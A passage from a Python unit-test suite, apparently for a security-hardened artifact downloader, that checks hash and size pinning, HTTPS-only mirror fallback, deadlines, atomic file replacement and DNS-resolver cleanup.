    ) -> downloader.DownloadResult:
        dependency_names = {
            "opener", "clock", "wall_clock", "sleep", "random_value",
        }
        if testing_open_url is None and dependency_names.isdisjoint(kwargs):
            return downloader.download(contract, **kwargs)

        opener = kwargs.pop("opener", None)
        if testing_open_url is None:
            if opener is None:
                return downloader._download_impl(contract, **kwargs)
            with mock.patch.object(
                downloader, "_build_https_opener", return_value=opener,
            ):
                return downloader._download_impl(contract, **kwargs)

        if opener is None:
            opener = downloader._build_https_opener()

        def injected_open(request, *, timeout):
            return testing_open_url(request, timeout)

        with mock.patch.object(
            opener, "open", side_effect=injected_open,
        ), mock.patch.object(
            downloader, "_build_https_opener", return_value=opener,
        ), mock.patch.object(downloader, "MIN_OPEN_BUDGET_SECONDS", 0):
            return downloader._download_impl(contract, **kwargs)

    def download_mirrors(
        self,
        contracts: tuple[downloader.DownloadContract, ...],
        *,
        testing_open_url=None,
        **kwargs,
    ) -> downloader.DownloadResult:
        dependency_names = {
            "opener", "clock", "wall_clock", "sleep", "random_value",
        }
        if testing_open_url is None and dependency_names.isdisjoint(kwargs):
            return downloader.download_mirrors(contracts, **kwargs)

        opener = kwargs.pop("opener", None)
        if testing_open_url is None:
            if opener is None:
                return downloader._download_mirrors_impl(contracts, **kwargs)
            with mock.patch.object(
                downloader, "_build_https_opener", return_value=opener,
            ):
                return downloader._download_mirrors_impl(contracts, **kwargs)

        if opener is None:
            opener = downloader._build_https_opener()

        def injected_open(request, *, timeout):
            return testing_open_url(request, timeout)

        with mock.patch.object(
            opener, "open", side_effect=injected_open,
        ), mock.patch.object(
            downloader, "_build_https_opener", return_value=opener,
        ), mock.patch.object(downloader, "MIN_OPEN_BUDGET_SECONDS", 0):
            return downloader._download_mirrors_impl(contracts, **kwargs)

    def test_public_download_api_rejects_dependency_injection(self) -> None:
        callback = mock.Mock()
        production_files = remote_consumer_files((
            ROOT / "maintenance/manage.py",
            ROOT / "maintenance/tools",
            ROOT / "dist/installer/bin",
        ))
        private_seams = ("_download_impl", "_download_mirrors_impl")
        private_consumers = [
            path.relative_to(ROOT)
            for path in production_files
            if path != DOWNLOADER_PATH
            and any(
                seam in path.read_text(encoding="utf-8")
                for seam in private_seams
            )
        ]
        self.assertEqual([], private_consumers)

        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            contract = self.pinned(destination)
            mirror_contracts = (contract,)
            injections = {
                "_testing" + "_open_url": callback,
                "opener": object(),
                "clock": lambda: 0.0,
                "wall_clock": lambda: 0.0,
                "sleep": lambda _delay: None,
                "random_value": lambda: 0.5,
            }
            for name, value in injections.items():
                with self.subTest(entrypoint="download", dependency=name):
                    with self.assertRaises(TypeError):
                        downloader.download(contract, **{name: value})
                with self.subTest(entrypoint="download_mirrors", dependency=name):
                    with self.assertRaises(TypeError):
                        downloader.download_mirrors(mirror_contracts, **{name: value})
            callback.assert_not_called()
            self.assertFalse(destination.exists())

            self.assertFalse(hasattr(downloader, "DEFAULT_OPENER"))
            self.assertFalse(hasattr(downloader, "build_https_opener"))

            # Exact regression: before this fix the public getter returned the
            # production singleton, so replacing its ``open`` method replaced
            # bytes consumed by ``download``. Even a legacy-looking exported
            # getter can no longer influence the private per-call transport.
            legacy_opener = downloader._build_https_opener()
            production_opener = downloader._build_https_opener()
            with mock.patch.object(
                legacy_opener, "open", return_value=FakeResponse(b"injetado"),
            ) as legacy_open, mock.patch.object(
                production_opener, "open", return_value=FakeResponse(b"seguro"),
            ), mock.patch.object(
                downloader, "build_https_opener", create=True,
                return_value=legacy_opener,
            ), mock.patch.object(
                downloader, "_build_https_opener", return_value=production_opener,
            ):
                result = downloader.download(
                    downloader.BoundedMetadata(
                        url=self.URL,
                        maximum_size=32,
                        deadline_seconds=1,
                        retry=downloader.RetryPolicy(attempts=1),
                    )
                )
            self.assertEqual(b"seguro", result.data)
            legacy_open.assert_not_called()

    @staticmethod
    def assert_no_download_temporaries(test: unittest.TestCase, directory: Path) -> None:
        test.assertEqual([], list(directory.glob(".*.download")))

    def test_pinned_download_promotes_atomically_after_complete_validation(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            destination = root / "artifact.zip"
            destination.write_bytes(b"installed version")
            response = FakeResponse(
                self.PAYLOAD,
                headers={"Content-Length": str(len(self.PAYLOAD))},
            )
            observed: dict[str, object] = {}

            if os.name == "nt":
                original_private_replace = downloader.private_fs.replace_open_private_file

                def observe_private_replace(
                    descriptor: int,
                    source: str | os.PathLike[str],
                    target: str | os.PathLike[str],
                ) -> None:
                    observed["destination_before_replace"] = destination.read_bytes()
                    observed["source"] = Path(source)
                    original_private_replace(descriptor, Path(source), Path(target))

                replacement = mock.patch.object(
                    downloader.private_fs,
                    "replace_open_private_file",
                    side_effect=observe_private_replace,
                )
            else:
                original_replace = os.replace

                def observe_replace(
                    source: str | os.PathLike[str], target: str | os.PathLike[str],
                ) -> None:
                    observed["destination_before_replace"] = destination.read_bytes()
                    observed["source"] = Path(source)
                    original_replace(source, target)

                replacement = mock.patch.object(
                    downloader.os, "replace", side_effect=observe_replace,
                )
            with replacement:
                result = self.download(
                    self.pinned(destination),
                    testing_open_url=self.response_opener(response),
                )

            self.assertEqual(b"installed version", observed["destination_before_replace"])
            self.assertEqual(self.PAYLOAD, destination.read_bytes())
            self.assertEqual(destination, result.path)
            self.assertEqual(len(self.PAYLOAD), result.size)
            self.assertEqual(hashlib.sha256(self.PAYLOAD).hexdigest(), result.sha256)
            self.assertEqual(1, result.attempts)
            self.assertFalse(Path(observed["source"]).exists())
            self.assert_no_download_temporaries(self, root)

    @unittest.skipUnless(os.name == "nt", "a janela de troca é específica do Windows")
    def test_windows_pinned_download_keeps_validated_identity_until_promotion(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            destination = root / "artifact.zip"
            response = FakeResponse(
                self.PAYLOAD,
                headers={"Content-Length": str(len(self.PAYLOAD))},
            )
            original_remaining = downloader._remaining
            replacement_attempts: list[bool] = []
            displaced = root / "displaced.bin"

            def attempt_replacement(deadline: float, clock) -> float:
                remaining = original_remaining(deadline, clock)
                for source in root.glob(".*.download"):
                    try:
                        os.replace(source, displaced)
                    except OSError:
                        replacement_attempts.append(False)
                    else:
                        replacement_attempts.append(True)
                        os.replace(displaced, source)
                return remaining

            with mock.patch.object(
                downloader, "_remaining", side_effect=attempt_replacement,
            ):
                result = self.download(
                    self.pinned(destination),
                    testing_open_url=self.response_opener(response),
                )

            self.assertTrue(replacement_attempts)
            self.assertFalse(
                any(replacement_attempts),
                "o temporário validado pôde ser trocado antes da promoção",
            )
            self.assertEqual(self.PAYLOAD, destination.read_bytes())
            self.assertEqual(destination, result.path)
            self.assertFalse(displaced.exists())
            self.assert_no_download_temporaries(self, root)

    def test_mirrors_share_one_deadline_across_retries_and_fallback(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            first_url = self.mirror_url(1)
            second_url = self.mirror_url(2)
            clock = AdvancingClock()
            timeouts: list[tuple[str, float]] = []

            def open_url(request: object, timeout: float) -> FakeResponse:
                url = str(getattr(request, "full_url"))
                timeouts.append((url, timeout))
                if url == first_url:
                    clock.advance(1)
                    raise downloader.DownloadTransientError("mirror indisponível")
                return FakeResponse(self.PAYLOAD, url=url)

            contracts = (
                self.pinned(
                    destination,
                    url=first_url,
                    deadline_seconds=5,
                    attempts=2,
                    initial_backoff=1,
                    maximum_backoff=1,
                ),
                self.pinned(
                    destination,
                    url=second_url,
                    deadline_seconds=5,
                    attempts=1,
                ),
            )
            result = self.download_mirrors(
                contracts,
                testing_open_url=open_url,
                clock=clock,
                sleep=clock.advance,
            )

            self.assertEqual(second_url, result.url)
            self.assertEqual(self.PAYLOAD, destination.read_bytes())
            self.assertEqual(
                [(first_url, 5), (first_url, 3), (second_url, 2)],
                timeouts,
            )

    def test_mirrors_fall_back_after_transport_and_integrity_failures(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            urls = tuple(self.mirror_url(index) for index in range(1, 4))
            failures: list[tuple[int, str, type[downloader.DownloadError]]] = []

            def open_url(request: object, _timeout: float) -> FakeResponse:
                url = str(getattr(request, "full_url"))
                if url == urls[0]:
                    raise downloader.DownloadTransportError("transporte encerrado")
                if url == urls[1]:
                    return FakeResponse(b"x" * len(self.PAYLOAD), url=url)
                return FakeResponse(self.PAYLOAD, url=url)

            result = self.download_mirrors(
                tuple(self.pinned(destination, url=url) for url in urls),
                testing_open_url=open_url,
                on_mirror_failure=lambda index, contract, error: failures.append(
                    (index, contract.url, type(error))
                ),
            )

            self.assertEqual(urls[2], result.url)
            self.assertEqual(
                [
                    (1, urls[0], downloader.DownloadTransportError),
                    (2, urls[1], downloader.DownloadIntegrityError),
                ],
                failures,
            )

    def test_mirror_retry_after_larger_than_budget_advances_to_next_origin(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            urls = (self.mirror_url(1), self.mirror_url(2))
            opened: list[str] = []
            sleeps: list[float] = []

            def busy_then_healthy(request: object, _timeout: float) -> FakeResponse:
                url = str(getattr(request, "full_url"))
                opened.append(url)
                if url == urls[0]:
                    raise urllib.error.HTTPError(
                        url,
                        503,
                        "Service Unavailable",
                        {"Retry-After": "30"},
                        None,
                    )
                return FakeResponse(self.PAYLOAD, url=url)

            result = self.download_mirrors(
                tuple(
                    self.pinned(
                        destination,
                        url=url,
                        deadline_seconds=2,
                        attempts=2,
                    )
                    for url in urls
                ),
                testing_open_url=busy_then_healthy,
                clock=lambda: 0,
                sleep=sleeps.append,
            )

            self.assertEqual(urls[1], result.url)
            self.assertEqual([urls[0], urls[1]], opened)
            self.assertEqual([], sleeps)
            self.assertEqual(self.PAYLOAD, destination.read_bytes())

    def test_mirrors_never_fall_back_after_local_or_contract_failure(self) -> None:
        terminal_failures = (
            downloader.DownloadStorageError("sem espaço"),
            downloader.DownloadPolicyError("política recusada"),
            downloader.DownloadDeadlineError("deadline encerrado"),
            downloader.DownloadProtocolError("headers contraditórios"),
            downloader.DownloadLimitError("resposta acima do limite"),
            downloader.DownloadRedirectError("redirect inseguro"),
        )
        for terminal_error in terminal_failures:
            with (
                self.subTest(error=type(terminal_error).__name__),
                tempfile.TemporaryDirectory() as temporary,
            ):
                destination = Path(temporary) / "artifact.zip"
                urls = (self.mirror_url(1), self.mirror_url(2))
                opened: list[str] = []
                callbacks: list[object] = []

                def open_url(request: object, _timeout: float) -> FakeResponse:
                    opened.append(str(getattr(request, "full_url")))
                    raise terminal_error

                with self.assertRaises(type(terminal_error)):
                    self.download_mirrors(
                        tuple(self.pinned(destination, url=url) for url in urls),
                        testing_open_url=open_url,
                        on_mirror_failure=lambda *_arguments: callbacks.append(_arguments),
                    )

                self.assertEqual([urls[0]], opened)
                self.assertEqual([], callbacks)
                self.assertFalse(destination.exists())
                self.assert_no_download_temporaries(self, destination.parent)

    def test_mirrors_do_not_fall_back_when_local_storage_cannot_be_opened(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            contracts = tuple(
                self.pinned(destination, url=self.mirror_url(index))
                for index in (1, 2)
            )
            open_url = mock.Mock()

            with mock.patch.object(
                downloader,
                "_open_temporary",
                side_effect=downloader.DownloadStorageError("destino indisponível"),
            ), self.assertRaises(downloader.DownloadStorageError):
                self.download_mirrors(contracts, testing_open_url=open_url)

            open_url.assert_not_called()

    def test_mirrors_validate_every_https_url_before_first_attempt(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            contracts = (
                self.pinned(destination, url=self.mirror_url(1)),
                self.pinned(destination, url="http://mirror-2.example.invalid/artifact.zip"),
            )
            open_url = mock.Mock()

            with self.assertRaises(downloader.DownloadPolicyError):
                self.download_mirrors(contracts, testing_open_url=open_url)

            open_url.assert_not_called()
            self.assertFalse(destination.exists())

    def test_unpinned_persistent_download_contract_is_not_exposed(self) -> None:
        self.assertFalse(hasattr(downloader, "BoundedPayload"))

    @unittest.skipIf(os.name == "nt", "mode POSIX 0600 não se aplica ao Windows")
    def test_temporary_is_private_before_atomic_promotion(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            destination = root / "artifact.zip"
            original_replace = os.replace
            observed_modes: list[int] = []

            def replace(source: str | os.PathLike[str], target: str | os.PathLike[str]) -> None:
                observed_modes.append(stat.S_IMODE(Path(source).stat().st_mode))
                original_replace(source, target)

            with mock.patch.object(downloader.os, "replace", side_effect=replace):
                self.download(
                    self.pinned(destination),
                    testing_open_url=self.response_opener(FakeResponse(self.PAYLOAD)),
                )

            self.assertEqual([0o600], observed_modes)

    @unittest.skipIf(os.name == "nt", "fchmod não se aplica ao Windows")
    def test_fchmod_failure_closes_and_preserves_the_private_temporary(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            real_close = os.close
            closed: list[int] = []

            def close(descriptor: int) -> None:
                closed.append(descriptor)
                real_close(descriptor)

            with mock.patch.object(
                downloader.os, "fchmod", side_effect=OSError(errno.EPERM, "denied")
            ), mock.patch.object(downloader.os, "close", side_effect=close):
                with self.assertRaises(downloader.DownloadStorageError):
                    self.download(
                        self.pinned(destination),
                        testing_open_url=self.response_opener(FakeResponse(self.PAYLOAD)),
                    )

            self.assertEqual(1, len(closed))
            residuals = list(destination.parent.glob(".*.download"))
            self.assertEqual(1, len(residuals))
            self.assertEqual(b"", residuals[0].read_bytes())
            self.assertEqual(0o600, stat.S_IMODE(residuals[0].stat().st_mode))

    def test_fdopen_failure_closes_and_removes_the_temporary(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            real_close = os.close
            closed: list[int] = []

            def close(descriptor: int) -> None:
                closed.append(descriptor)
                real_close(descriptor)

            with mock.patch.object(
                downloader.os, "fdopen", side_effect=OSError(errno.EIO, "fdopen failed")
            ), mock.patch.object(downloader.os, "close", side_effect=close):
                with self.assertRaises(downloader.DownloadStorageError):
                    self.download(
                        self.pinned(destination),
                        testing_open_url=self.response_opener(FakeResponse(self.PAYLOAD)),
                    )

            self.assertEqual(1, len(closed))
            self.assert_no_download_temporaries(self, destination.parent)

    def test_content_length_above_maximum_is_rejected_before_reading(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            response = FakeResponse(
                b"x",
                headers={"Content-Length": "100"},
            )
            contract = self.pinned(
                destination,
                payload=b"x",
                expected_size=1,
                maximum_size=1,
            )

            with self.assertRaises(downloader.DownloadLimitError):
                self.download(contract, testing_open_url=self.response_opener(response))

            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_oversized_metadata_content_length_is_rejected_without_reading(self) -> None:
        response = FakeResponse(
            b"ignored",
            headers={"Content-Length": "1048577"},
        )
        with self.assertRaises(downloader.DownloadLimitError):
            self.download(
                downloader.BoundedMetadata(
                    url=self.URL,
                    maximum_size=1024 * 1024,
                    deadline_seconds=10,
                    retry=downloader.RetryPolicy(attempts=1),
                    label="catálogo",
                ),
                testing_open_url=self.response_opener(response),
            )
        self.assertEqual(0, response._offset)

    def test_content_length_must_match_pinned_size(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            response = FakeResponse(
                self.PAYLOAD,
                headers={"Content-Length": str(len(self.PAYLOAD) - 1)},
            )

            with self.assertRaises(downloader.DownloadIntegrityError):
                self.download(
                    self.pinned(destination),
                    testing_open_url=self.response_opener(response),
                )

            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_invalid_content_length_is_protocol_error(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            response = FakeResponse(
                self.PAYLOAD,
                headers={"Content-Length": "12x"},
            )

            with self.assertRaises(downloader.DownloadProtocolError):
                self.download(
                    self.pinned(destination),
                    testing_open_url=self.response_opener(response),
                )

            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_duplicate_content_length_is_protocol_error(self) -> None:
        expected_length = str(len(self.PAYLOAD))

        class DuplicateHeaders(dict[str, str]):
            def get_all(self, name: str, default: list[str]) -> list[str]:
                if name.casefold() == "content-length":
                    return [expected_length, expected_length]
                return default

        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            response = FakeResponse(self.PAYLOAD)
            response.headers = DuplicateHeaders()

            with self.assertRaisesRegex(
                downloader.DownloadProtocolError, "Content-Length duplicado"
            ):
                self.download(
                    self.pinned(destination),
                    testing_open_url=self.response_opener(response),
                )

            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_unicode_content_length_is_protocol_error(self) -> None:
        response = FakeResponse(self.PAYLOAD, headers={"Content-Length": "²"})
        with self.assertRaises(downloader.DownloadProtocolError):
            self.download(
                downloader.BoundedMetadata(
                    url=self.URL,
                    maximum_size=1024,
                    deadline_seconds=10,
                    retry=downloader.RetryPolicy(attempts=1),
                ),
                testing_open_url=self.response_opener(response),
            )

    def test_stream_without_content_length_cannot_exceed_maximum(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            body = b"four"
            contract = self.pinned(
                destination,
                payload=body,
                expected_size=3,
                maximum_size=3,
            )

            with self.assertRaises(downloader.DownloadLimitError):
                self.download(
                    contract,
                    testing_open_url=self.response_opener(FakeResponse(body)),
                )

            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_pinned_stream_reads_only_one_byte_beyond_expected_size(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            response = RecordingEndlessResponse()
            with self.assertRaises(downloader.DownloadIntegrityError):
                self.download(
                    self.pinned(
                        destination,
                        payload=b"x",
                        expected_size=1,
                        maximum_size=1024 * 1024,
                    ),
                    testing_open_url=self.response_opener(response),
                )
            self.assertEqual([2], response.requested_sizes)

    def test_unbounded_metadata_stream_stops_immediately_after_limit(self) -> None:
        response = EndlessResponse()
        with self.assertRaises(downloader.DownloadLimitError):
            self.download(
                downloader.BoundedMetadata(
                    url=self.URL,
                    maximum_size=32,
                    deadline_seconds=10,
                    retry=downloader.RetryPolicy(attempts=1),
                    label="catálogo",
                ),
                testing_open_url=self.response_opener(response),
            )
        self.assertEqual(1, response.read_calls)

    def test_partial_metadata_body_must_match_declared_content_length(self) -> None:
        response = FakeResponse(
            b"short",
            headers={"Content-Length": "20"},
        )
        with self.assertRaises(downloader.DownloadTransientError):
            self.download(
                downloader.BoundedMetadata(
                    url=self.URL,
                    maximum_size=1024,
                    deadline_seconds=10,
                    retry=downloader.RetryPolicy(attempts=1),
                    label="catálogo",
                ),
                testing_open_url=self.response_opener(response),
            )

    def test_short_partial_response_is_rejected_and_destination_is_preserved(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            response = FakeResponse(
                self.PAYLOAD[:-3],
                headers={"Content-Length": str(len(self.PAYLOAD))},
            )

            with self.assertRaises(downloader.DownloadTransientError):
                self.download(
                    self.pinned(destination),
                    testing_open_url=self.response_opener(response),
                )

            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_partial_response_is_retried_with_a_fresh_temporary(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            opens = 0

            def partial_then_complete(_request: object, _timeout: float) -> FakeResponse:
                nonlocal opens
                opens += 1
                body = self.PAYLOAD[:-3] if opens == 1 else self.PAYLOAD
                return FakeResponse(
                    body,
                    headers={"Content-Length": str(len(self.PAYLOAD))},
                )

            result = self.download(
                self.pinned(
                    destination,
                    attempts=2,
                    initial_backoff=0,
                    maximum_backoff=0,
                ),
                testing_open_url=partial_then_complete,
                sleep=lambda _delay: None,
            )

            self.assertEqual(2, result.attempts)
            self.assertEqual(self.PAYLOAD, destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_wrong_sha256_is_rejected_and_destination_is_preserved(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            contract = self.pinned(destination, expected_sha256="0" * 64)

            with self.assertRaises(downloader.DownloadIntegrityError):
                self.download(
                    contract,
                    testing_open_url=self.response_opener(FakeResponse(self.PAYLOAD)),
                )

            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_temporary_cleanup_failure_is_reported_without_changing_destination(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            contract = self.pinned(destination, expected_sha256="0" * 64)

            with mock.patch.object(
                downloader.Path,
                "unlink",
                side_effect=OSError(errno.EPERM, "unlink denied"),
            ):
                with self.assertRaisesRegex(
                    downloader.DownloadStorageError, "limpeza do temporário também falhou"
                ):
                    self.download(
                        contract,
                        testing_open_url=self.response_opener(FakeResponse(self.PAYLOAD)),
                    )

            self.assertEqual(b"preserve", destination.read_bytes())

    def test_total_deadline_expires_during_response_read(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            calls = 0

            def clock() -> float:
                nonlocal calls
                calls += 1
                return 0.0 if calls <= 3 else 2.0

            with self.assertRaises(downloader.DownloadDeadlineError):
                self.download(
                    self.pinned(destination, deadline_seconds=1),
                    testing_open_url=self.response_opener(FakeResponse(self.PAYLOAD)),
                    clock=clock,
                )

            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_deadline_is_rechecked_after_fsync_before_atomic_replace(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            destination = Path(temporary) / "artifact.zip"
            destination.write_bytes(b"preserve")
            clock = AdvancingClock()
            original_fsync = os.fsync

            def slow_fsync(descriptor: int) -> None:
                original_fsync(descriptor)
                clock.advance(2)

            with mock.patch.object(
                downloader.os, "fsync", side_effect=slow_fsync,
            ), self.assertRaises(downloader.DownloadDeadlineError):
                self.download(
                    self.pinned(destination, deadline_seconds=1),
                    testing_open_url=self.response_opener(FakeResponse(self.PAYLOAD)),
                    clock=clock,
                )

            self.assertEqual(b"preserve", destination.read_bytes())
            self.assert_no_download_temporaries(self, destination.parent)

    def test_opener_receives_remaining_deadline_as_timeout_keyword(self) -> None:
        opener = downloader._build_https_opener()
        with mock.patch.object(opener, "open", return_value=FakeResponse(b"metadata")) as opened:
            result = self.download(
                downloader.BoundedMetadata(
                    url=self.URL,
                    maximum_size=32,
                    deadline_seconds=7,
                    retry=downloader.RetryPolicy(attempts=1),
                ),
                opener=opener,
                clock=lambda: 10,
            )
        self.assertEqual(b"metadata", result.data)
        request = opened.call_args.args[0]
        self.assertEqual("identity", request.get_header("Accept-encoding"))
        self.assertEqual({"timeout": 7}, opened.call_args.kwargs)

    def test_worker_recomputes_connection_budget_after_scheduling_delay(self) -> None:
        clock = AdvancingClock()
        observed: list[float] = []
        real_start = downloader.threading.Thread.start

        def delayed_start(thread: threading.Thread) -> None:
            clock.advance(3)
            real_start(thread)

        def open_url(_request: urllib.request.Request, timeout: float) -> FakeResponse:
            observed.append(timeout)
            return FakeResponse(b"metadata")

        with mock.patch.object(downloader.threading.Thread, "start", delayed_start):
            result = self.download(
                downloader.BoundedMetadata(
                    url=self.URL,
                    maximum_size=32,
                    deadline_seconds=5,
                    retry=downloader.RetryPolicy(attempts=1),
                ),
                testing_open_url=open_url,
                clock=clock,
            )

        self.assertEqual(b"metadata", result.data)
        self.assertEqual([2], observed)

    def test_connection_registry_shutdowns_socket_before_close(self) -> None:
        actions: list[object] = []

        class ActiveSocket:
            def shutdown(self, how: int) -> None:
                actions.append(("shutdown", how))

        class ActiveConnection:
            def __init__(self) -> None:
                self.sock = ActiveSocket()

            def cancel_transport(self) -> None:
                actions.append("cancel_transport")

            def close(self) -> None:
                actions.append("close")

        registry = downloader._ConnectionRegistry()
        registry.register(17, ActiveConnection())
        registry.cancel(17)

        self.assertEqual([
            "cancel_transport",
            ("shutdown", socket.SHUT_RDWR),
            "close",
        ], actions)
        with self.assertRaises(downloader.DownloadDeadlineError):
            registry.ensure_active(17)

    def test_socket_makefile_lifetime_is_not_a_cancellation_primitive(self) -> None:
        client, peer = socket.socketpair()
        stream = client.makefile("rb")
        try:
            # socket.close() only marks the socket closed while a makefile()
            # stream still owns a reference to the underlying transport.  A
            # cancellation contract must therefore not depend on cross-thread
            # close interrupting BufferedReader.readline(), notably on Windows.
            client.close()
            peer.sendall(b"HTTP/1.1 200 OK\r\n")
            self.assertEqual(b"HTTP/1.1 200 OK\r\n", stream.readline())
        finally:
            stream.close()
            peer.close()
            client.close()

    def test_dns_resolver_process_is_killed_and_collected_at_deadline(self) -> None:
        class BlockingResolver:
            def __init__(self) -> None:
                self.returncode = None
                self.calls = 0
                self.killed = False

            def communicate(self, input: bytes | None = None, timeout: float | None = None):
                self.calls += 1
                if self.calls == 1:
                    raise subprocess.TimeoutExpired(["python"], timeout)
                self.returncode = -9
                return b"", b""

            def kill(self) -> None:
                self.killed = True

        process = BlockingResolver()
        with mock.patch.object(downloader.subprocess, "Popen", return_value=process):
            with self.assertRaisesRegex(TimeoutError, "resolver example.invalid"):
                downloader._resolve_addresses("example.invalid", 443, 0.01)

        self.assertTrue(process.killed)
        self.assertEqual(2, process.calls)

    def test_dns_resolver_subprocess_returns_bounded_local_candidates(self) -> None:
        candidates = downloader._resolve_addresses("localhost", 80, 3)

        self.assertGreaterEqual(len(candidates), 1)
        self.assertLessEqual(len(candidates), downloader.DNS_MAX_CANDIDATES)
        self.assertTrue(all(item[0] in {socket.AF_INET, socket.AF_INET6} for item in candidates))

    def test_dns_process_startup_is_deducted_from_its_budget(self) -> None:
        class ImmediateResolver:
            args = ["python", "resolver"]
            returncode = 0

            def __init__(self) -> None:
                self.timeouts: list[float | None] = []

            def communicate(self, input: bytes | None = None, timeout: float | None = None):
                self.timeouts.append(timeout)
                payload = json.dumps([[
                    socket.AF_INET,
                    socket.SOCK_STREAM,
                    6,
                    "",
                    ["127.0.0.1", 443],
                ]]).encode()
                return payload, b""

        process = ImmediateResolver()
        with mock.patch.object(
            downloader.subprocess, "Popen", return_value=process,
        ), mock.patch.object(
            downloader.time, "monotonic", side_effect=[10.0, 10.05],
        ):
            downloader._resolve_addresses("example.invalid", 443, 0.2)

        self.assertEqual(1, len(process.timeouts))
        self.assertAlmostEqual(0.15, process.timeouts[0], places=6)

    def test_complete_download_cancels_and_collects_blocked_resolver(self) -> None:
        process = BlockingResolverProcess()
        with mock.patch.object(downloader.subprocess, "Popen", return_value=process):
            with self.assertRaises(downloader.DownloadDeadlineError):
                self.download(
                    downloader.BoundedMetadata(
                        url=self.URL,
                        maximum_size=1024,
                        deadline_seconds=1,
                        retry=downloader.RetryPolicy(attempts=1),
                    )
                )

        # A deadline cancellation and the resolver's own timeout can complete
        # on separate scheduler turns on slower Windows/Python combinations.
        self.assertTrue(process.killed.wait(RESOLVER_CLEANUP_WAIT_SECONDS))
        self.assertTrue(process.collected.is_set())
        self.assertEqual(b"G", process.inputs[0])
        self.assertTrue(process.dns_started.is_set())
        self.assertFalse(any(
            thread.name == "x86qw-download-open" and thread.is_alive()
            for thread in threading.enumerate()
        ))

    def test_complete_download_reserves_time_for_slow_resolver_reap(self) -> None:
        process = BlockingResolverProcess(reap_delay=0.2)
        with mock.patch.object(downloader.subprocess, "Popen", return_value=process):
            with self.assertRaises(downloader.DownloadDeadlineError):
                self.download(
                    downloader.BoundedMetadata(
                        url=self.URL,
                        maximum_size=1024,
                        deadline_seconds=1,
                        retry=downloader.RetryPolicy(attempts=1),
                    )
                )

        # The controller kills the resolver before returning, while the daemon
        # worker may need one final scheduler turn to finish reaping it.
        self.assertTrue(process.collected.wait(RESOLVER_CLEANUP_WAIT_SECONDS))
        self.assertEqual(b"G", process.inputs[0])
        self.assertTrue(process.dns_started.is_set())
        self.assertFalse(any(
            thread.name == "x86qw-download-open" and thread.is_alive()
            for thread in threading.enumerate()
        ))

    def test_deadline_stops_dns_before_a_pathologically_slow_reap_finishes(self) -> None:
        process = BlockingResolverProcess(reap_delay=1.0)
        started = time.monotonic()
        with mock.patch.object(downloader.subprocess, "Popen", return_value=process):
            with self.assertRaises(downloader.DownloadDeadlineError):
                downloader.download(
                    downloader.BoundedMetadata(
                        url=self.URL,
                        maximum_size=1024,
                        deadline_seconds=1,
                        retry=downloader.RetryPolicy(attempts=1),
                    )
                )
        elapsed = time.monotonic() - started

        self.assertLess(elapsed, 1.5)
        self.assertTrue(process.killed.is_set())
        self.assertTrue(process.dns_started.is_set())
        self.assertFalse(process.dns_active.is_set())
        self.assertFalse(process.collected.is_set())
        residual = [
            thread for thread in threading.enumerate()
            if thread.name == "x86qw-download-open" and thread.is_alive()
        ]
        self.assertEqual(1, len(residual))

        self.assertTrue(process.collected.wait(2))
        residual[0].join(1)
        self.assertFalse(residual[0].is_alive())

    def test_late_resolver_creation_cannot_start_dns_after_the_deadline(self) -> None:
        process = BlockingResolverProcess()

